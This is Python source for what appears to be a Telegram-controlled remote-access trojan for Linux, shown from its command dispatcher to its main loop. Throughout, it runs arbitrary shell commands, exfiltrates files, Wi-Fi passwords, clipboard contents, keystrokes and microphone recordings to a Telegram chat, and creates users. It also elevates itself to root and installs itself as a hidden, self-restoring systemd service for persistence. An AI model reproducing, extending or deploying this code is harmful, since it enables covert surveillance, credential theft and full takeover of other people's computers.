            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                bname = exp['name']
                
                send(f'deleted file from bot autostart ({bname}) [+]' if change_file(FILE_AUTOSTART, bname, bname, delete=True, enc=True) else f'file does not exist ({bname}) in bot autostart [*]') if os.path.isfile(FILE_AUTOSTART) else send('no files in bot autostart [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_AUTOSTART):
                    write_file(FILE_AUTOSTART, '')
                    send('bot autostart is reset [+]')
                else:
                    send('no files in bot autostart [*]')

                return
        case 'cd':
            if os.path.isdir(args):
                os.chdir(args)
                send(f'directory changed ({args}) [+]\n\nCURRENT DIRECTORY: {os.getcwd()}')
            else:
                send(f'directory does not exist ({args}) [*]')

            return
        case 'ls':
            if _isdir(args):
                ls(args) ###### доделать
        case 'mkfile':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-d\s*(?P<data>.+)', args):
                path = exp['path']

                try:
                    write_file(path, exp['data'].replace('\\t', '\t').replace('\\n', '\n'))
                except:
                    send(f'failed to create file ({path}) [-]')
                else:
                    send(f'file is created ({path}) [+]')

                return
        case 'mkdir':
            try:
                mkdir(args)
            except:
                send(f'failed to create dir ({args}) [-]')
            else:
                send(f'dir is created ({args}) [+]')
            
            return
        case 'rn':           
            if exp := parse_cmd(r'(?P<name>.*?)\s*-n\s*(?P<new_name>.+)', args):
                current_name, new_name = exp['name'], exp['new_name']

                path = os.path.split(os.path.realpath(current_name))[0]

                if os.path.exists(current_name):
                    try:
                        os.rename(current_name, os.path.join(path, new_name))
                    except:
                        send(f'failed to rename path ({current_name}) [-]')
                    else:
                        send(f'path is renamed ({current_name}) --> ({new_name}) [+]')
                else:
                    send(f'path does not exist ({current_name}) [*]')

                return
        case 'rm':
            if os.path.isfile(args):
                try:
                    os.remove(args)
                except:
                    send(f'failed to delete file ({args}) [-]')
                else:
                    send(f'file is deleted ({args}) [+]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        case 'rmdir':
            if os.path.isdir(args):
                try:
                    shutil.rmtree(args)
                except:
                    send(f'failed to delete dir ({args}) [-]')
                else:
                    send(f'dir is deleted ({args}) [+]')
            else:
                send(f'dir does not exist ({args}) [*]')
            
            return
        case 'cp':        
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        (shutil.copy if os.path.isfile(from_path) else shutil.copytree)(from_path, to_path)
                    except:
                        send(f'failed to copy path ({from_path}) [-]')
                    else:
                        send(f'path is copied ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'mv':           
            if exp := parse_cmd(r'(?P<from_path>.*?)\s*-t\s*(?P<to_path>.+)', args):
                from_path, to_path = exp['from_path'], exp['to_path']

                if os.path.exists(from_path):
                    try:
                        shutil.move(from_path, to_path)
                    except:
                        send(f'failed to move path ({from_path}) [-]')
                    else:
                        send(f'path is moved ({from_path}) --> ({to_path}) [+]')
                else:
                    send(f'path does not exist ({from_path}) [*]')

                return
        case 'chmod':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-m\s*(?P<mode>\d+)', args):
                mpath, cmode = exp['path'], int(exp['mode'], base=8)

                if not os.path.exists(mpath):
                    send(f'path does not exist ({mpath})')
                    return

                try:
                    os.chmod(mpath, cmode)
                except:
                    send(f'failed to change path mode ({mpath})')
                else:
                    send(f'changed path mode ({mpath}) --> ({cmode})')
                
                return
        case 'hide':
            if os.path.exists(args):
                send(f'path is hidden ({args}) [+]' if hide(args) else f'failed to hide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'unhide':
            if os.path.exists(args):
                send(f'path is unhidden ({args}) [+]' if unhide(args) else f'failed to unhide path ({args}) [-]')
            else:
                send(f'path does not exist ({args}) [*]')
            
            return
        case 'cat':
            if os.path.isfile(args):
                try:
                    file_data = read_file(args, b=True)
                    send(file_data, doc=os.path.split(args)[-1]) if file_data else send(f'file is empty ({args}) [*]')
                except:
                    send(f'failed to download file ({args}) [-]')
            else:
                send(f'file does not exist ({args}) [*]')

            return
        case 'inet':
            if args == '-e':
                shell('nmcli networking on')
                return
            elif args == '-d':
                shell('nmcli networking off')
                return
        case 'wifi':
            if args == '-g':
                wifi_list = wifi()

                send(tabulate(wifi_list, headers=[('SSID'), ('BSSID'), ('CHANNEL'), ('RATE'), ('MODE'), ('SECURITY'), ('SIGNAL')], tablefmt='grid'), doc='wifi.txt') if wifi_list else send(NULL)
                return
            elif args == '-p':
                wifi_password_list = wifi_password()

                send(tabulate(wifi_password_list, headers=[('SSID'), ('PASSWORD')], tablefmt='grid'), doc='wifi_password.txt') if wifi_password_list else send(NULL)
                return
        case 'site':           
            if exp := parse_cmd(r'-p\s*(?P<url>.+)', args):
                url = exp['url']

                try:
                    open_site(url)
                except:
                    send(f'failed to open website ({url}) [-]')
                else:
                    send(f'website is opened ({url}) [+]')
                
                return
            elif exp := parse_cmd(r'-d\s*(?P<url>.*?)\s*-n\s*(?P<name>.+)', args):
                url, name = exp['url'], exp['name']

                query_http = http(url)

                if query_http is None:
                    send(f'failed to query website ({url}) [*]')
                    return

                try:
                    write_file(os.path.join(PATH_SHARE, name), query_http)
                except:
                    send(f'failed to download from website ({url}) [-]')
                else:
                    send(f'file is downloaded from website ({url}) --> ({name}) [+]')

                return
            elif args == '-l':
                if os.path.isfile(FILE_HOSTS):
                    bsites = []

                    for line in read_file(FILE_HOSTS).splitlines():
                        n = line.split()

                        if (len(n) > 4) and (n[2] == '#'):
                            bsites.append([n[1], f'{n[-1]} | {n[-2]}'])

                    send(tabulate(bsites, headers=[('DOMAIN'), ('DATE')], tablefmt='grid'), doc='blocked_sites.txt') if bsites else send('no blocked sites [*]')
                else:
                    send('no blocked sites [*]')

                return  
            elif exp := parse_cmd(r'-b\s*(?P<domain>.+)', args):
                domain, date = exp['domain'], get_date()

                try:
                    verify_domain(domain)
                except:
                    send(f'domain does not exist ({domain}) [*]')
                    return

                if not os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')

                send(f'site is blocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, f'127.0.0.1       {domain} # {date[0]} {date[1]}') else f'failed to block site ({domain}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<domain>.+)', args):
                domain = exp['domain']

                send(f'site is unblocked ({domain}) [+]' if change_file(FILE_HOSTS, domain, domain, delete=True) else f'site does not exist ({domain}) [*]') if os.path.isfile(FILE_HOSTS) else send('no blocked sites [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_HOSTS):
                    write_file(FILE_HOSTS, '')
                    send('sites is unblocked [+]')
                else:
                    send('no blocked sites [*]')
                    
                return
        case 'modprobe':
            if args == '-g':
                modprobe_list = modprobe('get')

                send(tabulate(modprobe_list, headers=[('NAME'), ('SIZE'), ('USED'), ('MODULE')], tablefmt='grid'), doc='modprobe.txt') if modprobe_list else send(NULL)
                return
            elif exp := parse_cmd(r'(?P<mode>-i|-d)\s*(?P<name>.+)', args):
                mmode, mmodule = 'installed' if exp['mode'] == '-i' else 'deleted', exp['name']

                send(f'modprobe module is {mmode} ({mmodule}) [+]' if modprobe(mmode, mmodule) else f'failed to {mmode} modprobe module ({mmodule}) [-]')
                return
        case 'service':
            if args == '-g':
                systemctl_str = systemctl('get')

                send(systemctl_str, doc='service.txt') if systemctl_str else send(NULL)
                return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                service = systemctl('query', name)

                send(service, doc='service.txt') if service else send(f'service does not exist ({name}) [*]')
                return
            elif args == '-u':
                send('service is updated [+]' if systemctl('update') else 'failed to update service [-]')
                return      
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-d\s*(?P<description>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.*?)\s*-u\s*(?P<user>root|user)', args):
                send(systemctl(
                    'create',
                    name=exp['name'], 
                    description=exp['description'], 
                    path=exp['path'], 
                    args=exp['args'], 
                    root=exp['user'] == 'root'
                ))
                return
            elif exp := parse_cmd(r'(?P<mode>-d|-e|-i|-l|-r|-s)\s*(?P<name>.+)', args):
                name = exp['name']

                match exp['mode']:
                    case '-d':
                        send(systemctl('delete', name))
                    case '-e':
                        send(systemctl('enable', name))
                    case '-i':
                        send(systemctl('disable', name))
                    case '-l':
                        send(systemctl('start', name))
                    case '-r':
                        send(systemctl('restart', name))
                    case '-s':
                        send(systemctl('stop', name))
                    
                return
        case 'crontab':
            if args == '-g':
                crontab_list = crontab('get')

                send(tabulate(crontab_list, headers=[('NAME'), ('TASK')], tablefmt='grid'), doc='crontab.txt') if crontab_list else send('crontab is empty [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-e\s*(?P<event>.*?)\s*-u\s*(?P<user>root|user)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                send(crontab(
                    'create',
                    name=exp['name'],
                    event=exp['event'],
                    root=exp['user'] == 'root',
                    path=exp['path'],
                    args=exp['args']
                ))
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                send(crontab('delete', exp['name']))
                return 
        case 'startup':
            if args == '-g':
                startup_str = startup('get')

                send(startup_str if startup_str else 'startup is empty [*]')
                return 
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                send(startup(
                    'create', 
                    name=exp['name'],
                    path=exp['path'],
                    args=exp['args']
                    ))
                return
            elif exp := parse_cmd(r'(?P<mode>-d|-l)\s*(?P<name>.+)', args):
                send(startup('delete' if exp['mode'] == '-d' else 'start', exp['name']))
                return
        case 'env':
            if args == '-g':
                env_str = env('get')

                send(env_str, doc='environment.txt') if env_str else send(NULL)
                return
            elif exp := parse_cmd(r'-q\s*(?P<key>.+)', args):
                ekey = exp['key']

                env_str = env('query', ekey) 

                send(env_str) if env_str else send(f'environment key does not exist ({ekey}) [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<key>.*?)\s*-v\s*(?P<value>.+)', args):
                send(env('create', exp['key'], exp['value']))
                return
            elif exp := parse_cmd(r'-d\s*(?P<key>.+)', args):
                send(env('delete', exp['key']))
                return
            elif args == '-b':
                init_user()

                printenv = shell('printenv', output=True)

                send(printenv, doc='bot_environment.txt') if printenv else send('bot environment is empty [*]')
                return
            elif exp := parse_cmd(r'-g\s*(?P<key>.+)', args):
                ekey = exp['key']

                send(str(os.getenv(ekey, f'bot environment key does not exist ({ekey}) [*]')))
                return
            elif exp := parse_cmd(r'-s\s*(?P<key>.*?)\s*-v\s*(?P<value>.+)', args):
                ekey, evalue = exp['key'], exp['value']

                try:
                    os.putenv(ekey, evalue)
                except:
                    send(f'failed to set bot environment key ({ekey}) [-]')
                else:
                    send(f'bot environment key is set ({ekey}) [+]')

                return
        case 'user':
            if args == '-g':
                user_str = user('get')

                send(user_str, doc='user.txt') if user_str else send(NULL)
                return
            elif exp := parse_cmd(r'-q\s*(?P<name>.+)', args):
                name = exp['name']

                user_str = user('get', name)

                send(user_str) if user_str else send(f'user does not exist ({name}) [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<name>.*?)\s*-p\s*(?P<password>.+)', args):
                uname, upassword = exp['name'], exp['password']

                send(user('create', uname, upassword))
                return 
            elif exp := parse_cmd(r'-d\s*(?P<name>.*?)', args):
                send(user('delete', exp['name']))
                return 
        case 'block':
            if args == '-l':
                try:
                    blocked_apps = decrypt(read_file(FILE_APP_BLOCKER)).splitlines()
                except:
                    send('no blocked apps [*]')
                    return
                
                bapps = []
                
                for line in blocked_apps:
                    n = line.split('=')

                    if len(n) == 2:
                        bapps.append([n[0], n[1]])
                
                send(tabulate(bapps, headers=[('NAME'), ('DATE')], tablefmt='grid'), doc='blocked_apps.txt') if bapps else send('no blocked apps [*]')
                return
            elif exp := parse_cmd(r'-b\s*(?P<name>.+)', args):
                name, date = exp['name'], get_date()

                if not os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')

                send(f'app is blocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, f'{name}={date[0]} | {date[1]}', enc=True) else f'failed to block app ({name}) [-]')
                return
            elif exp := parse_cmd(r'-d\s*(?P<name>.+)', args):
                name = exp['name']

                send(f'app is unblocked ({name}) [+]' if change_file(FILE_APP_BLOCKER, name, name, delete=True, enc=True) else f'app does not exist ({name}) [*]') if os.path.isfile(FILE_APP_BLOCKER) else send('no blocked apps [*]')
                return
            elif args == '-r':
                if os.path.isfile(FILE_APP_BLOCKER):
                    write_file(FILE_APP_BLOCKER, '')
                    send('apps is unblocked [+]')
                else:
                    send('no blocked apps [*]')

                return
        case 'kill':
            send(f'killed ({args}) [+]' if kill(args) else f'failed to kill ({args}) [-]')
            return
        case 'run':
            if exp := parse_cmd(r'(?P<path>.*?)\s*-a\s*(?P<args>.+)', args):
                file_path, file_args = exp['path'], exp['args']

                start_file = launch(file_path, '' if file_args == 'none' else file_args)

                if start_file is None:
                    send(f'path does not exist ({file_path}) [*]')
                else:
                    send(f'ran file ({args}) [+]' if start_file else f'failed to run file ({args}) [-]') 

                return
        case 'cmd':
            if exp := parse_cmd(r'(?P<output>-e|-g)\s*(?P<command>.+)', args):
                output, command = exp['output'] == '-g', exp['command']

                if not output:
                    send(f'cmd command is executed ({command}) [+]' if shell(command) else f'failed to execute cmd command ({command}) [-]')
                else:
                    exec_cmd = shell(command, output=True)
                    send(exec_cmd, doc='cmd.txt') if exec_cmd else send(f'command not found ({command}) in cmd [*]')

                return
        case 'time':
            if args == '-g':
                send(get_date()[0])
                return
            elif exp := parse_cmd(r'-s\s*(?P<time>.+)', args):
                time_ = exp['time']

                send(f'time is changed ({time_}) [+]' if shell(f'date +%T -s {quote(time_)}') else f'time is invalid ({time_}) [-]') 
                return
        case 'date':
            if args == '-g':
                send(get_date()[1])
                return
            elif exp := parse_cmd(r'-s\s*(?P<date>.+)', args):
                date = exp['date']

                send(f'date is changed ({date}) [+]' if shell(f'date +%F -s {quote(date)}') else f'date is invalid ({date}) [-]')
                return       
        case 'mouse':
            if args == '-p':
                x, y = mouse.get_position()

                send(f'mouse position ({x}x{y})')
                return
            elif exp := parse_cmd(r'-x\s*(?P<x>\d+)\s*-y\s*(?P<y>\d+)\s*-d\s*(?P<delay>\d+)', args):
                x, y, delay = int(exp['x']), int(exp['y']), int(exp['delay'])

                mouse.move(x, y, duration=delay)
                send(f'mouse is moved ({x}x{y}) [+]')
                return
            elif exp := parse_cmd(r'(?P<button>-l|-r|-m)\s*-c\s*(?P<click>\d+)\s*-d\s*(?P<delay>\d+)', args):
                click, delay, button = int(exp['click']), int(exp['delay']), exp['button']

                match button:
                    case '-l':
                        button = 'left'
                        mbutton = mouse.LEFT
                    case '-r':
                        button = 'right'
                        mbutton = mouse.RIGHT
                    case '-m':
                        button = 'middle'
                        mbutton = mouse.MIDDLE
                            
                for _ in range(click):
                    mouse.press(mbutton)
                    sleep(delay)
                    mouse.release(mbutton)

                send(f'mouse button ({button}) is clicked ({click}) [+]')
                return
            elif exp := parse_cmd(r'-s\s*(?P<amount>-*\d+)', args):
                amount = int(exp['amount'])

                mouse.wheel(amount)
                send(f'mouse is scrolled ({amount}) [+]')
                return
        case 'keyboard':
            if exp := parse_cmd(r'-t\s*(?P<text>.*?)\s*-d\s*(?P<delay>\d+)', args):
                text, delay = exp['text'], int(exp['delay'])

                kb.write(text, delay)
                send(f'keyboard wrote ({text}) [+]')
                return
            elif exp := parse_cmd(r'-k\s*(?P<key>.*?)\s*-p\s*(?P<amount>\d+)\s*-d\s*(?P<delay>\d+)', args):
                key, amount, delay = exp['key'], int(exp['amount']), int(exp['delay'])

                for _ in range(amount):
                    try:
                        kb.press(key)
                        sleep(delay)
                        kb.release(key)
                    except:
                        send(f'keyboard key is invalid ({key}) [-]')
                        return

                send(f'keyboard key ({key}) is pressed ({amount}) [+]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<type>-k|-h)\s*(?P<key>.*?)\s*-n\s*(?P<new_key>.+)', args):
                key_type, key, new_key = exp['type'], exp['key'], exp['new_key']

                try:
                    (kb.remap_key if key_type == '-k' else kb.remap_hotkey)(key, new_key)
                except:
                    send('failed to remap keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) [-]')
                else:
                    send('remapped keyboard ' + ('key' if key_type == '-k' else 'hotkey') + f' ({key}) --> ({new_key}) [+]')

                return
            elif exp := parse_cmd(r'-b\s*(?P<key>.+)', args):
                key = exp['key']

                try:
                    kb.block_key(key)
                except:
                    send(f'failed to block keyboard key ({key}) [-]')
                else:
                    send(f'keyboard key is blocked ({key}) [+]')

                return
            elif args == '-r':
                kb.unhook_all()
                send(f'keyboard keys is unblocked [+]')
                return  
        case 'clipboard':
            if args == '-g':
                clipboard_data = cb.paste()
                send(clipboard_data, doc='clipboard.txt') if clipboard_data else send('clipboard is empty [*]')
                return
            elif exp := parse_cmd(r'-c\s*(?P<data>.+)', args):
                cb.copy(exp['data'])
                send('copied to clipboard [+]')
                return
            elif args == '-r':
                cb.copy('')
                send(f'clipboard is cleared [+]')
                return
        case 'audio':
            if exp := parse_cmd(r'(?P<type>-m|-p)\s*(?P<second>\d+)', args):
                rtype, second = 'system' if exp['type'] == '-p' else 'microphone', int(exp['second'])

                if second > 600:
                    send(f'maximum sound limit is 600 seconds [*]')
                    return
                
                send(f'audio start record {rtype} ({second}s) [*]')
                mp3 = audio(rtype, second)

                send('failed to record audio [-]') if mp3 is None else send(mp3, doc='audio.mp3')
                return
            elif exp := parse_cmd(r'-s\s*(?P<path>.+)', args):
                audio_path = exp['path']

                if os.path.isfile(audio_path):
                    try:
                        shell(f'ffplay -nodisp -autoexit -loglevel quiet {quote(audio_path)}')
                        send(f'audio is playing ({audio_path}) [*]')
                    except:
                        send(f'failed to play audio ({audio_path}) [-]')
                    else:
                        send(f'audio is played ({audio_path}) [+]')
                else:
                    send(f'audio does not exist ({audio_path}) [*]')

                return
        case 'msg':
            if exp := parse_cmd(r'(?P<type>-p|-s)\s*(?P<title>.*?)\s*-t\s*(?P<text>.+)', args):
                msg_type, title, text = exp['type'], exp['title'].replace('\\t', '\t').replace('\\n', '\n'), exp['text'].replace('\\t', '\t').replace('\\n', '\n')
                
                if msg_type == '-p':      
                    shell(f'notify-send -u critical {quote(title)} {quote(text)}')
                    send('msg push [+]')
                else:
                    shell(f'xmessage -geometry 400x200 -title {quote(title)} {quote(text)}')
                    send('msg system [+]')
                    
                return
        case 'keylogger':
            if exp := parse_cmd(r'-g\s*(?P<mode>base|char|hotkey|no hotkey)', args):
                if os.path.isfile(FILE_KEYLOGGER):
                    try:
                        data = keylogger_parser(exp['mode'])

                        send(data, doc='keylogger.txt') if data else send('keylogger data is empty [*]')
                    except:
                        send('failed to get keylogger data [-]')
                else:
                    send('keylogger is disabled [*]')
                
                return

            match args:
                case '-e':
                    write_file(FILE_KEYLOGGER_FLAG, '1')
                    send('keylogger is enabled [+]')
                    return
                case '-d':
                    write_file(FILE_KEYLOGGER_FLAG, '0')
                    send('keylogger is disabled [+]')
                    return
                case '-s':
                    send('keylogger is enabled [+]' if os.path.isfile(FILE_KEYLOGGER_FLAG) and (read_file(FILE_KEYLOGGER_FLAG) == '1') else 'keylogger is disabled [-]')
                    return   
                case '-r':
                    if os.path.isfile(FILE_KEYLOGGER):
                        write_file(FILE_KEYLOGGER, '')
                        send('keylogger data is reset [+]')
                    else:
                        send('keylogger is disabled [*]')

                    return

    send(f'command not found ({cmd})')


def get_root():
    if '--root' in argv:
        return

    if not os.path.isfile(PATH_BASH) or (not IS_ROOT and not os.path.isfile(PATH_SUDO)):
        raise PermissionError('root rights are required to execute')
    
    scmd = ' '.join(quote(n) for n in [PATH_SUDO, pyexe, __file__, '--root'])
    Process(target=lambda: shell(f'{quote(PATH_BASH)} -c {quote(scmd)}', _new=True)).start()
    os._exit(0)


def install_lib(name):
    if find_spec(name) is None:
        shell(f'{quote(FILE_PIP)} install {quote(name)}', timeout=120) 
    

def init_libs():
    global TeleBot, ApiException
    from telebot import TeleBot
    from telebot.apihelper import ApiException 

    global psutil
    try:
        import psutil
    except:
        psutil = None

    global mouse
    try:
        import mouse
    except:
        mouse = None

    global kb
    try:
        import keyboard as kb
    except:
        kb = None

    global cb
    try:
        import pyperclip as cb
    except:
        cb = None

    global mss, to_png
    try:
        from mss import mss
        from mss.tools import to_png
    except:
        mss, to_png = None, None

    global ffmpeg
    try:
        import ffmpeg
    except:
        ffmpeg = None

    global http_get
    try:
        from requests import get as http_get
    except:
        http_get = None

    global detect
    try:
        from chardet import detect
    except:
        detect = None

    global tabulate
    try:
        from tabulate import tabulate
    except:
        tabulate = None
    

def init_bot_exe():
    if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_PATH_HIDDEN):
        shutil.move(BOT_FILE_PATH_HIDDEN, BOT_FILE_PATH)

    while True:
        mkdir([
            PATH,
            PATH_MEM,
            PATH_SYS, 
            PATH_CONF,
            PATH_TMP,
            PATH_SHARE
        ])
        
        if not os.path.isfile(BOT_FILE_PATH_RECOVERY) and os.path.isfile(BOT_FILE_PATH):
            shutil.copy(BOT_FILE_PATH, BOT_FILE_PATH_RECOVERY)
        
        if not os.path.isfile(BOT_FILE_PATH) and os.path.isfile(BOT_FILE_PATH_RECOVERY):
            shutil.copy(BOT_FILE_PATH_RECOVERY, BOT_FILE_PATH)

        if not os.path.isfile(FILE_INIT):
            write_file(FILE_INIT, f'#!{PATH_BASH}\nexec "{FILE_PYTHON}" "{BOT_FILE_PATH}" --root')
            os.chmod(FILE_INIT, 0o755)   

        systemctl(
            'create',
            name=BOT_SERVICE_NAME,
            description=BOT_SERVICE_DESCRIPTION,
            path=FILE_INIT,
            root=True,
            _reload=False
        )

        sleep(3)


def setup():
    global BOT_FILE_PATH_HIDDEN

    if BOT_EXE:
        BOT_FILE_PATH_HIDDEN = hide(__file__, _ret=True)

    mkdir([
        PATH,
        PATH_MEM,
        PATH_SYS, 
        PATH_CONF,
        PATH_TMP,
        PATH_SHARE
    ])
   
    if not os.path.isdir(PATH_VENV):
        shell(f'{quote(pyexe)} -m venv {quote(PATH_VENV)}')

    for n in LIBS:
        install_lib(n)

    try:
        init_libs()
    except ImportError:
        if '--import' not in argv:
            os.execv(
                FILE_PYTHON, 
                [
                    FILE_PYTHON, 
                    BOT_FILE_PATH_HIDDEN if BOT_EXE else __file__, 
                    '--root', 
                    '--import', 
                    f'--name={BOT_FILE_NAME}'
                ]
            )
        else:
            raise SystemError('failed to install libraries')
  
    if BOT_EXE:
        Thread(target=init_bot_exe, daemon=False).start()


def init():
    invalid_type('TOKEN', TOKEN, str)
    invalid_type('PASSWORD', PASSWORD, str)
    invalid_type('SEED', SEED, int)
    invalid_type('PATH', PATH, str)
    invalid_type('BOT_SERVICE_NAME', BOT_SERVICE_NAME, str)
    invalid_type('BOT_SERVICE_DESCRIPTION', BOT_SERVICE_DESCRIPTION, str)

    if len(TOKEN) != 46:
        raise ValueError('Telegram bot (TOKEN) is invalid')
    
    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')
    
    try:
        decrypt(encrypt(' \t\n\u200B\u200F\u20600123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZабвгдеёжзийклмнопрстуфхцчшщыэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЫЭЮЯЄєЇїІіҐґ'))
    except:
        raise ValueError('(SEED) is invalid')
    
    if not os.path.isdir(os.path.split(PATH)[0]):
        raise ValueError('(PATH) is invalid')
    
    if BOT_EXE and not BOT_SERVICE_NAME:
        raise ValueError('(BOT_SERVICE_NAME) is empty')
    
    if BOT_EXE and not BOT_SERVICE_DESCRIPTION:
        raise ValueError('(BOT_SERVICE_DESCRIPTION) is empty')
    
    get_root()
        
    setup()
    Thread(target=autostart, daemon=False).start()
    Thread(target=app_blocker, daemon=False).start()
    Thread(target=keylogger, daemon=False).start()


def init_user():
    global LOGGED_USER, PATH_CONF_STARTUP

    LOGGED_USER_UID, LOGGED_USER = get_logged_user()

    if os.getenv('LOGGED_USER') == LOGGED_USER:
        return

    PATH_CONF_STARTUP = f'/home/{LOGGED_USER}/.config/autostart'

    run_user = f'{PATH_RUN_USER}/{LOGGED_USER_UID}'
    dkey, display = get_display(LOGGED_USER_UID)
    xauth = f'/home/{LOGGED_USER}/.Xauthority'

    if not os.path.isfile(xauth) and os.path.isdir(run_user):
        for n in os.listdir(run_user):
            if 'waylandauth' in n:
                xauth = os.path.join(run_user, n)
                break

    os.putenv('LOGGED_USER', LOGGED_USER)
    if dkey is not None: os.environ[dkey] = display
    os.environ['XAUTHORITY'] = xauth

    
def bot():
    tg = TeleBot(
        TOKEN,
        validate_token=True,
        disable_web_page_preview=True,
        protect_content=True,
        threaded=True,
        num_threads=3,
        suppress_middleware_excepions=True
    )

    try:
        tg.get_me()
    except ApiException:
        raise SystemExit('TOKEN', '(TOKEN) is invalid or unauthorized')

    session_date = get_date()
    session = f'''
GitHub   : https://github.com/vk-candpython
AUTHOR   : Vladislav Khudash
VERSION  : linux

HOST     : {NODE}\\\\{USER} 
PLATFORM : {OS[0]} {OS[1]}
DATE     : {session_date[0]} | {session_date[1]}
'''
    

    def send(chat_id, data, doc=''):
        if not doc:
            tg.send_message(chat_id, data) 
        else:
            if isinstance(data, str):
                data = data.encode()

            tg.send_document(chat_id, data, visible_file_name=doc)


    def verify_user(chat_id, user_id, user_name, password, date):
        password = password.encode()

        path_user = os.path.join(PATH_MEM, mem_id(user_id))

        if os.path.isfile(path_user): 
            return True
        
        if sha256(password).hexdigest() == PASSWORD:
            send(chat_id, session)
            write_file(path_user, encrypt(f'{user_name}={date[0]} | {date[1]}'))
            return True
        else:
            send(chat_id, 'Enter password to connect to session [*]')
            return False


    @tg.message_handler(content_types=['text'])
    def executor(msg):
        chat_id = msg.chat.id 
        user_id = msg.from_user.id 
        user_name = msg.from_user.username
        cmd = msg.text.strip()

        if not verify_user(chat_id, user_id, user_name, cmd, session_date):
            return
        elif cmd == 'session':
            send(chat_id, session)
            return
        elif cmd == 'exit':
            session_id = mem_id(user_id)
            mem_user = os.path.join(PATH_MEM, session_id)

            if os.path.isfile(mem_user):
                os.remove(mem_user)
                send(chat_id, f'session is left ({session_id}) [+]')
            else:
                send(chat_id, f'your account is not verified ({user_id}) [*]')
            
            return
        
        send_execute = lambda data, doc='': send(chat_id, data, doc)

        try:
            execute(cmd, send_execute)
        except BaseException as error:
            send(chat_id, f'{type(error).__name__}({error})')

    
    @tg.message_handler(content_types=['document'])
    def upload(file): 
        chat_id = file.chat.id 
        user_id = file.from_user.id 
        doc_id = file.document.file_id
        doc_name = file.document.file_name

        if not verify_user(chat_id, user_id, '', '', ''):
            return

        try:
            write_file(os.path.join(PATH_SHARE, doc_name), tg.download_file(tg.get_file(doc_id).file_path))
        except:
            send(chat_id, f'failed to upload file {doc_name}) [-]')
        else:
            send(chat_id, f'file is uploaded ({doc_name}) [+]')


    tg.infinity_polling(
        skip_pending=True,
        allowed_updates=['message'],
        timeout=30, 
        long_polling_timeout=30
    )


def main():
    init()

    while True:
        try:
            bot()
        except SystemExit as er:
            arg = er.args

            if 'TOKEN' in arg:
                raise ValueError(arg[1])
        except:
            sleep(10)
    



if __name__ == '__main__': main() 
